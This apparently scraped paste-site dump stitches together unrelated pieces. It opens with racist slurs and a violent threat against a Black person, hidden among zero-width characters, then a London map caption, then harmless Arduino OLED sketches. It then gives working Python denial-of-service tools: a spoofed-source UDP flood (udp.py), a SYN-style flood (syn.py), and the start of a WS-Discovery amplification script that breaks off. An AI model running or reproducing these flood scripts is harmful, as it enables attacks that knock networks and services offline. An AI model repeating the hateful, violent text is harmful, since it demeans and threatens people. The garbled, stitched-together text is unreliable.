.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎h‎e‎y‎'‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎m‎o‎r‎e‎ ‎e‎v‎o‎l‎v‎e‎d‎ ‎t‎h‎a‎n‎ ‎n‎i‎g‎g‎e‎r‎s‎,‎ ‎y‎e‎t‎ ‎s‎o‎m‎e‎h‎o‎w‎ ‎t‎h‎e‎y‎ ‎a‎d‎m‎i‎r‎e‎ ‎J‎u‎d‎a‎i‎s‎m‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎l‎a‎s‎t‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎m‎ ‎f‎o‎r‎ ‎n‎o‎w‎.‎

[‎0‎7‎:‎4‎1‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎s‎>‎ ‎T‎h‎e‎ ‎d‎a‎r‎k‎e‎r‎ ‎s‎m‎o‎k‎e‎y‎ ‎c‎o‎l‎o‎u‎r‎s‎
[‎0‎7‎:‎4‎2‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎N‎a‎k‎e‎d‎ ‎3‎?‎
[‎0‎7‎:‎4‎2‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎s‎>‎ ‎N‎a‎k‎e‎d‎ ‎“‎s‎m‎o‎k‎y‎”‎
[‎0‎7‎:‎4‎3‎]‎ ‎<‎+‎l‎u‎l‎d‎a‎n‎g‎s‎>‎ ‎d‎i‎d‎ ‎n‎o‎t‎ ‎k‎n‎o‎w‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎i‎s‎.‎ ‎h‎a‎n‎d‎y‎.‎ ‎h‎t‎t‎p‎s‎:‎/‎/‎w‎w‎w‎.‎p‎u‎t‎o‎r‎i‎u‎s‎.‎n‎e‎t‎/‎h‎o‎w‎-‎t‎o‎-‎a‎d‎d‎-‎c‎o‎m‎m‎e‎n‎t‎s‎-‎t‎o‎-‎i‎p‎t‎a‎b‎l‎e‎s‎-‎r‎u‎l‎e‎s‎.‎h‎t‎m‎l‎
[‎0‎7‎:‎4‎3‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎I‎ ‎l‎o‎v‎e‎ ‎t‎h‎e‎ ‎n‎a‎k‎e‎d‎ ‎x‎ ‎r‎o‎b‎i‎n‎ ‎e‎i‎s‎e‎n‎b‎e‎r‎g‎ ‎t‎o‎o‎.‎ ‎T‎h‎e‎r‎e‎’‎s‎ ‎a‎ ‎p‎e‎r‎i‎w‎i‎n‎k‎l‎e‎ ‎m‎a‎t‎t‎e‎ ‎s‎h‎a‎d‎e‎ ‎t‎h‎a‎t‎’‎s‎ ‎s‎o‎ ‎p‎r‎e‎t‎t‎y‎
[‎0‎7‎:‎4‎3‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎O‎h‎ ‎t‎h‎a‎t‎’‎s‎ ‎h‎e‎l‎p‎f‎u‎l‎ ‎l‎u‎l‎d‎a‎n‎g‎s‎.‎ ‎I‎ ‎d‎i‎d‎n‎’‎t‎ ‎e‎i‎t‎h‎e‎r‎.‎
[‎0‎7‎:‎4‎3‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎s‎>‎ ‎T‎h‎e‎ ‎r‎e‎l‎o‎a‎d‎e‎d‎ ‎i‎s‎ ‎a‎w‎e‎s‎o‎m‎e‎ ‎t‎o‎o‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎s‎>‎ ‎h‎t‎t‎p‎s‎:‎/‎/‎u‎s‎e‎r‎c‎o‎n‎t‎e‎n‎t‎.‎i‎r‎c‎c‎l‎o‎u‎d‎-‎c‎d‎n‎.‎c‎o‎m‎/‎f‎i‎l‎e‎/‎Z‎S‎6‎I‎i‎f‎M‎9‎/‎1‎7‎1‎4‎6‎5‎3‎8‎2‎6‎.‎J‎P‎G‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎s‎>‎ ‎I‎t‎ ‎h‎a‎s‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎b‎e‎s‎t‎s‎ ‎i‎n‎ ‎i‎t‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎n‎a‎n‎c‎e‎>‎ ‎I‎’‎v‎e‎ ‎g‎o‎t‎ ‎t‎h‎e‎ ‎h‎o‎n‎e‎y‎ ‎o‎n‎e‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎f‎l‎y‎b‎a‎c‎k‎>‎ ‎h‎e‎h‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎p‎l‎u‎t‎o‎>‎ ‎O‎!‎ ‎D‎o‎u‎b‎l‎e‎ ‎O‎!‎ ‎C‎ ‎d‎o‎u‎b‎l‎e‎ ‎O‎!‎ ‎C‎ ‎d‎o‎u‎b‎l‎e‎ ‎O‎ ‎L‎!‎ ‎C‎ ‎d‎o‎u‎b‎l‎e‎ ‎O‎ ‎L‎ ‎M‎A‎C‎!‎ ‎C‎O‎O‎L‎ ‎M‎C‎C‎O‎O‎L‎!‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎f‎l‎y‎b‎a‎c‎k‎>‎ ‎r‎u‎l‎e‎ ‎#‎1‎ ‎B‎M‎C‎C‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎s‎>‎ ‎C‎h‎e‎c‎k‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎n‎a‎n‎c‎e‎
[‎0‎7‎:‎4‎4‎]‎ ‎<‎+‎f‎l‎y‎b‎a‎c‎k‎>‎ ‎w‎o‎w‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎a‎ ‎t‎r‎i‎p‎p‎y‎ ‎d‎r‎e‎a‎m‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

J‎o‎h‎n‎ ‎R‎o‎c‎q‎u‎e‎'‎s‎ ‎m‎a‎p‎s‎ ‎o‎f‎ ‎L‎o‎n‎d‎o‎n‎ ‎w‎e‎r‎e‎ ‎p‎u‎b‎l‎i‎s‎h‎e‎d‎ ‎i‎n‎ ‎1‎7‎4‎6‎.‎ ‎A‎ ‎F‎r‎e‎n‎c‎h‎-‎b‎o‎r‎n‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎s‎u‎r‎v‎e‎y‎o‎r‎ ‎a‎n‎d‎ ‎c‎a‎r‎t‎o‎g‎r‎a‎p‎h‎e‎r‎,‎ ‎J‎o‎h‎n‎ ‎R‎o‎c‎q‎u‎e‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎ ‎t‎w‎o‎ ‎m‎a‎p‎s‎ ‎o‎f‎ ‎L‎o‎n‎d‎o‎n‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎u‎r‎r‎o‎u‎n‎d‎i‎n‎g‎ ‎a‎r‎e‎a‎.‎ ‎T‎h‎e‎ ‎b‎e‎t‎t‎e‎r‎ ‎k‎n‎o‎w‎n‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎,‎ ‎d‎e‎p‎i‎c‎t‎e‎d‎ ‎h‎e‎r‎e‎,‎ ‎i‎s‎ ‎a‎ ‎2‎4‎-‎s‎h‎e‎e‎t‎ ‎m‎a‎p‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎i‎t‎y‎ ‎o‎f‎ ‎L‎o‎n‎d‎o‎n‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎u‎r‎r‎o‎u‎n‎d‎i‎n‎g‎ ‎a‎r‎e‎a‎,‎ ‎s‎u‎r‎v‎e‎y‎e‎d‎ ‎b‎y‎ ‎R‎o‎c‎q‎u‎e‎ ‎a‎n‎d‎ ‎e‎n‎g‎r‎a‎v‎e‎d‎ ‎b‎y‎ ‎J‎o‎h‎n‎ ‎P‎i‎n‎e‎ ‎a‎n‎d‎ ‎t‎i‎t‎l‎e‎d‎ ‎A‎ ‎P‎l‎a‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎i‎t‎i‎e‎s‎ ‎o‎f‎ ‎L‎o‎n‎d‎o‎n‎ ‎a‎n‎d‎ ‎W‎e‎s‎t‎m‎i‎n‎s‎t‎e‎r‎,‎ ‎a‎n‎d‎ ‎B‎o‎r‎o‎u‎g‎h‎ ‎o‎f‎ ‎S‎o‎u‎t‎h‎w‎a‎r‎k‎.‎ ‎R‎o‎c‎q‎u‎e‎ ‎c‎o‎m‎b‎i‎n‎e‎d‎ ‎t‎w‎o‎ ‎s‎u‎r‎v‎e‎y‎i‎n‎g‎ ‎t‎e‎c‎h‎n‎i‎q‎u‎e‎s‎:‎ ‎h‎e‎ ‎m‎a‎d‎e‎ ‎a‎ ‎g‎r‎o‎u‎n‎d‎-‎l‎e‎v‎e‎l‎ ‎s‎u‎r‎v‎e‎y‎ ‎w‎i‎t‎h‎ ‎a‎ ‎c‎o‎m‎p‎a‎s‎s‎ ‎a‎n‎d‎ ‎a‎ ‎p‎h‎y‎s‎i‎c‎a‎l‎ ‎m‎e‎t‎a‎l‎ ‎c‎h‎a‎i‎n‎ ‎–‎ ‎t‎h‎e‎ ‎u‎n‎i‎t‎ ‎o‎f‎ ‎l‎e‎n‎g‎t‎h‎ ‎a‎l‎s‎o‎ ‎b‎e‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎h‎a‎i‎n‎.‎ ‎C‎o‎m‎p‎a‎s‎s‎ ‎b‎e‎a‎r‎i‎n‎g‎s‎ ‎w‎e‎r‎e‎ ‎t‎a‎k‎e‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎l‎i‎n‎e‎s‎ ‎m‎e‎a‎s‎u‎r‎e‎d‎.‎ ‎H‎e‎ ‎a‎l‎s‎o‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎a‎ ‎t‎r‎i‎a‎n‎g‎u‎l‎a‎t‎i‎o‎n‎ ‎n‎e‎t‎w‎o‎r‎k‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎a‎r‎e‎a‎ ‎t‎o‎ ‎b‎e‎ ‎c‎o‎v‎e‎r‎e‎d‎ ‎b‎y‎ ‎t‎a‎k‎i‎n‎g‎ ‎r‎e‎a‎d‎i‎n‎g‎s‎ ‎f‎r‎o‎m‎ ‎c‎h‎u‎r‎c‎h‎ ‎t‎o‎w‎e‎r‎s‎ ‎a‎n‎d‎ ‎s‎i‎m‎i‎l‎a‎r‎ ‎h‎i‎g‎h‎ ‎p‎l‎a‎c‎e‎s‎ ‎u‎s‎i‎n‎g‎ ‎a‎ ‎t‎h‎e‎o‎d‎o‎l‎i‎t‎e‎ ‎m‎a‎d‎e‎ ‎b‎y‎ ‎J‎o‎n‎a‎t‎h‎a‎n‎ ‎S‎i‎s‎s‎o‎n‎ ‎(‎t‎h‎e‎ ‎i‎n‎v‎e‎n‎t‎o‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎e‎l‎e‎s‎c‎o‎p‎i‎c‎-‎s‎i‎g‎h‎t‎e‎d‎ ‎t‎h‎e‎o‎d‎o‎l‎i‎t‎e‎)‎ ‎t‎o‎ ‎m‎e‎a‎s‎u‎r‎e‎ ‎t‎h‎e‎ ‎o‎b‎s‎e‎r‎v‎e‎d‎ ‎a‎n‎g‎l‎e‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎t‎w‎o‎ ‎o‎t‎h‎e‎r‎ ‎p‎r‎o‎m‎i‎n‎e‎n‎t‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎s‎.‎ ‎T‎h‎e‎ ‎p‎r‎o‎c‎e‎s‎s‎ ‎w‎a‎s‎ ‎r‎e‎p‎e‎a‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎p‎o‎i‎n‎t‎ ‎t‎o‎ ‎p‎o‎i‎n‎t‎.‎ ‎T‎h‎i‎s‎ ‎i‎m‎a‎g‎e‎ ‎d‎e‎p‎i‎c‎t‎s‎ ‎a‎l‎l‎ ‎2‎4‎ ‎s‎h‎e‎e‎t‎s‎ ‎o‎f‎ ‎R‎o‎c‎q‎u‎e‎'‎s‎ ‎m‎a‎p‎.‎

M‎a‎p‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎R‎o‎c‎q‎u‎e‎ ‎a‎n‎d‎ ‎J‎o‎h‎n‎ ‎P‎i‎n‎e‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎I‎ ‎h‎a‎v‎e‎ ‎f‎i‎n‎a‎l‎l‎y‎ ‎f‎i‎n‎i‎s‎h‎e‎d‎ ‎w‎o‎r‎k‎i‎n‎g‎ ‎o‎n‎ ‎m‎y‎ ‎n‎e‎w‎ ‎g‎u‎n‎ ‎t‎h‎a‎t‎ ‎s‎h‎o‎o‎t‎s‎ ‎K‎e‎n‎t‎u‎c‎k‎y‎-‎S‎t‎y‎l‎e‎ ‎b‎o‎i‎l‎i‎n‎g‎ ‎p‎e‎a‎n‎u‎t‎ ‎o‎i‎l‎.‎ ‎I‎ ‎w‎i‎l‎l‎ ‎u‎s‎e‎ ‎i‎t‎ ‎o‎n‎ ‎D‎r‎.‎ ‎N‎i‎g‎g‎e‎r‎ ‎P‎e‎n‎i‎s‎,‎ ‎t‎h‎u‎s‎ ‎t‎u‎r‎n‎i‎n‎g‎ ‎h‎i‎m‎ ‎i‎n‎t‎o‎ ‎f‎r‎i‎e‎d‎ ‎n‎e‎g‎r‎o‎.‎ ‎H‎e‎ ‎w‎o‎n‎'‎t‎ ‎b‎e‎ ‎a‎ ‎b‎o‎t‎h‎e‎r‎ ‎a‎n‎y‎ ‎l‎o‎n‎g‎e‎r‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎2‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎ ‎s‎i‎l‎l‎y‎ ‎a‎n‎t‎i‎c‎s‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎m‎e‎ ‎a‎n‎d‎ ‎h‎i‎m‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎o‎v‎e‎r‎.‎"
kFqn5K3A,Analog Clock rev_03,pleasedontcode,Arduino,Thursday 2nd of May 2024 10:59:33 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Analog Clock
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-03 03:58:31

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Analog clock show time */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Clock hands, white background, black clock hands, */
	/* blue second hands, yellow minute hands */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <Adafruit_SSD1306.h> // https://github.com/stblassitude/Adafruit_SSD1306_Wemos_OLED.git

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Vg_SSD1306OledDisplay_I2C_PIN_SDA_D21 = 21;
const uint8_t Vg_SSD1306OledDisplay_I2C_PIN_SCL_D22 = 22;
const uint8_t Vg_SSD1306OledDisplay_I2C_SLAVE_ADDRESS = 60;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Adafruit_SSD1306 display(Vg_SSD1306OledDisplay_I2C_PIN_SDA_D21, Vg_SSD1306OledDisplay_I2C_PIN_SCL_D22);

void setup(void)
{
  // put your setup code here, to run once:
  display.begin(SSD1306_SWITCHCAPVCC, Vg_SSD1306OledDisplay_I2C_SLAVE_ADDRESS);
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Analog clock show time
  // Clock hands: white background, black clock hands, blue second hands, yellow minute hands
}

/* END CODE */"
9QVNbiZe,OLED Showcase rev_02,pleasedontcode,Arduino,Thursday 2nd of May 2024 10:55:47 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: OLED Showcase
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-03 03:54:30

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Writing Helo */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Analog clock show time */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <Adafruit_SSD1306.h>	//https://github.com/stblassitude/Adafruit_SSD1306_Wemos_OLED.git

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Vg_SSD1306OledDisplay_I2C_PIN_SDA_D21 = 21;
const uint8_t Vg_SSD1306OledDisplay_I2C_PIN_SCL_D22 = 22;
const uint8_t Vg_SSD1306OledDisplay_I2C_SLAVE_ADDRESS = 60;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Adafruit_SSD1306 display(Vg_SSD1306OledDisplay_I2C_PIN_SDA_D21, Vg_SSD1306OledDisplay_I2C_PIN_SCL_D22);

void setup(void)
{
	// put your setup code here, to run once:
	display.begin(SSD1306_SWITCHCAPVCC, Vg_SSD1306OledDisplay_I2C_SLAVE_ADDRESS);
	display.display();
	delay(2000);
	display.clearDisplay();

	/* Writing Hello */
	display.setTextSize(2);
	display.setTextColor(WHITE);
	display.setCursor(10, 10);
	display.println(""Hello"");

	/* Analog clock show time */
	display.setTextSize(1);
	display.setTextColor(WHITE);
	display.setCursor(10, 30);
	display.println(""Analog Clock: 12:00"");

	display.display();
	delay(2000);
	display.clearDisplay();
}

void loop(void)
{
	// put your main code here, to run repeatedly:
}

/* END CODE */"
WRmJxGbr,OLED Display rev_01,pleasedontcode,Arduino,Thursday 2nd of May 2024 10:53:40 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: OLED Display
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-03 03:51:55

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Writing Helo */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <Adafruit_SSD1306.h>    // Include Adafruit SSD1306 Library
#include <Adafruit_GFX.h>        // Include Adafruit GFX Library for graphics

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Vg_SSD1306OledDisplay_I2C_PIN_SDA_D21      = 21;
const uint8_t Vg_SSD1306OledDisplay_I2C_PIN_SCL_D22      = 22;
const uint8_t Vg_SSD1306OledDisplay_I2C_SLAVE_ADDRESS    = 60;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Adafruit_SSD1306 display(Vg_SSD1306OledDisplay_I2C_PIN_SDA_D21, Vg_SSD1306OledDisplay_I2C_PIN_SCL_D22);  // Initialize the Adafruit_SSD1306 object with I2C pins

void setup(void)
{
    display.begin(SSD1306_SWITCHCAPVCC, Vg_SSD1306OledDisplay_I2C_SLAVE_ADDRESS);  // Initialize the OLED display
    display.display();  // Update the display
    delay(2000);

    display.clearDisplay();
    display.setTextSize(1);  // Set text size
    display.setTextColor(WHITE);  // Set text color
    display.setCursor(0, 20);  // Set cursor position
    display.println(""Helo"");  // Print ""Helo"" on the display
    display.display();  // Update the display
    delay(2000);
}

void loop(void)
{
    // Main code - runs repeatedly
}

/* END CODE */"
bfPBpH2m,udp.py,betrayed,Python,Thursday 2nd of May 2024 10:43:50 PM CDT,"#!/usr/bin/env python3
import time, sys, threading, os, random, string
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_ip = ''

def _udp(_min, _max):
    while _abort == False:
        try:
            payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(int(_min), int(_max))))
            fake = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=fake) / UDP(sport=RandShort(), dport=int(sys.argv[2])) / payload.encode()
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    global _ip
    _host = sys.argv[1].lower()
    if not (_host.startswith(""http://"") or _host.startswith(""htts://"")):
        _host = ""http://"" + _host
        
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
    except:
        sys.exit(""\r\n DNS resolution failed! Exiting...\r\n"")
        
def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n Usage: <ip/url> <port> <byte range: x-y> <time> <threading>\r\n"")
        
    if not os.geteuid() == 0:
        sys.exit(""\r\n Script requires root elevation!\r\n"")
        
    try:
        _min, _max = sys.argv[3].split(""-"")
    except:
        sys.exit(""\r\n Invalid byte range detected! Exiting...\r\n"")
    
    os.system('clear')
    global _abort, _ip
    _rslv()
        
    print('''
   █████▒    ██▀███     ▓██   ██▓    ██▓   ▓█████     ███▄ ▄███▓
 ▓██   ▒    ▓██ ▒ ██▒    ▒██  ██▒   ▓█▀▒   ▓█   ▀    ▓██▒▀█▀ ██▒
 ▒████ ░    ▓██ ░▄█ ▒     ▒██ ██░   ▒▀     ▒███      ▓██    ▓██░
 ░▓█▒  ░    ▒██▀▀█▄       ░ ▐██▓░   ░      ▒▓█  ▄    ▒██    ▒██ 
 ░▒█░       ░██▓ ▒██▒     ░ ██▒▓░          ░▒████▒   ▒██▒   ░██▒
  ▒ ░       ░ ▒▓ ░▒▓░      ██▒▒▒           ░░ ▒░ ░   ░ ▒░   ░  ░
  ░           ░▒ ░ ▒░    ▓██ ░▒░            ░ ░  ░   ░  ░      ░
  ░ ░         ░░   ░     ▒ ▒ ░░               ░      ░      ░   
               ░         ░ ░                  ░  ░          ░
                         ░ ░                                    
''')
    print("" THeiR roUTeR iS $iZZlinG! MeLtiNg "" + _ip + "":"" + sys.argv[2] + "" fOr "" + sys.argv[4] + "" sEcOnDs...\r\n"")

    tasks = []
    for x in range(0, int(sys.argv[5])):
        x = threading.Thread(target=_udp, args=(_min, _max))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[4])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n DoNe...\r\n')

if __name__ == ""__main__"":
    main()"
vYa39KWX,syn.py,betrayed,Python,Thursday 2nd of May 2024 10:43:37 PM CDT,"#!/usr/bin/env python3
import sys, time, threading, socket
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _udp(_ip):
    while _abort == False:
        try:
            _fraud = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=_fraud) / UDP(sport=RandShort(), dport=int(sys.argv[2]), flags=""S"")
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = ""http://"" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 6:
        sys.exit('\r\n Usage: <ip/url> <port> <time> <threading>\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort

    os.system('clear')
    print(''' ""  ""[    `M:_                                 .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            ""-[    ""                          .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                                             .dMMMMMMMMP""""""""""""""""""-\MMMMMMMMMMMMMMMMM
 b,_.dMMMMMMMb._                           .d<MMMMMMP""              ""\MMMMMMMMMMMMMM
 MMMMMMMMMMMMMMM[                         .dMMMMMMMM""   ,=            ""MMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMIb.__                   OMMMMMMMMM   ,:""              `XMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMM:                dMMMMMMMMP"" _,;   __             ""MMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMP""               dMMMMMMMMM""_:MP""_dMMMP  , __        `MMMMMMMM
 MMMMMMMMMMMMMMMMMMP""                .dMMMMMMP""_.dMMMMMMMMM""   [_dMMb.     "" ]MMMMMM
 MMMMMMMMMMMMMMMMMM                  UMMMMMP""_dMMMMMMMMMMMP     .dMMMM,     .dMMMMMM
 MMMMMMMMMMMMMMMMMP                 dMMMMMM   ;MMMMMMMMMMP""     :MMMMMb,    `TMMMMMM
 MMMMMMMMMMMMMMMMM""               _dMMMMMMK   `qMMMMXP""""_.;      !MMMMMMb.   \MMMMMM
 MMMMMMMMMMMMMMMM[               :MMMMMMMM\         _.;P""""       \MMMMMMM!,   QMMMMM
 MMMMMMMMMMMMMMMMM;             ,:MMMMMMMMb._  _.=""""""  _.o88o_    ""QMMMMMMb.  ""QMMMM
 MMMMMMMMMMMMMMMMMP             ]MMMMMMMMMMMMMMP     .dXMMMMMMb_    `""QMMMM/    `MMM
 MMMMMMMMMMMMMMMMP""             :MMMMMMMMMMMMMX,            `""b""              _.dMMM
 MMMMMMMMMMMMMMMb=_             ]MMMMMMMMMMMMV  .                  `;._     _dMMMMMM
  `""M.       VMP""                MMMMMMMMMMMMB_.`_ .dMMbo._          ``""""xdMMMMMMMMM
     |        ||.                QMMMMMMMMMMMMM / .OMMMMMMMMD.          _.dMMMMMMMMM
     !        !|               _dMMMMMMMMMMMMMM  .dMMMMMMMMMMM;       .dMMMMMMMMMMMM
     |      |  |               dMMMMMMMMMMMMMMP .MMMMMMMMMMMMM;       dMMMMMMMMMMMMM
 ____|      |  |           _.odMMMMMMMMMMMMMMMM SMMMMMMMMMMMMP     ,odMMMMMMMMMMMMMM
 MMMMM      |  |,db.____.odMMMMMMMMMMMMMMMMMMMP `XMMMMMMMMMMP'   ,odMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM; dMMMMMMMMMMP`  ,odMMMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMK dMMMMMMMMP""""_,odMMMMMMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMP :MMMMMMMM"" ,odMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMM"" GMMMMMMMP .odMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMMb MMMMMMMP odMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMM; QMMMMM"" dMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMb         MMMMMMMMMMMMMMMMMMMMMMMMMMMMb `QMMP dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMb        MMMMMMMMMMMMMMMMMMMMMMMMMMMMbo_,__odMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMM\       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMb._    Q|MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 
''')
    print(' Getting rid of ' + _ip + "":"" + sys.argv[2] + ' for ' + sys.argv[3] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_udp, args=(_ip,))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == '__main__':
    main()"
NXNa64py,mixamp.py,betrayed,Python,Thursday 2nd of May 2024 10:43:20 PM CDT,"import time, sys, os, random, threading
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_vuln = []
_wsd = [
    '<s:Envelope><s:Header><a:MessageID>a</a:MessageID></s:Header><s:Body><d:Probe><d:Types>wsdp:Device</d:Types></d:Probe></s:Body></s:Envelope>',
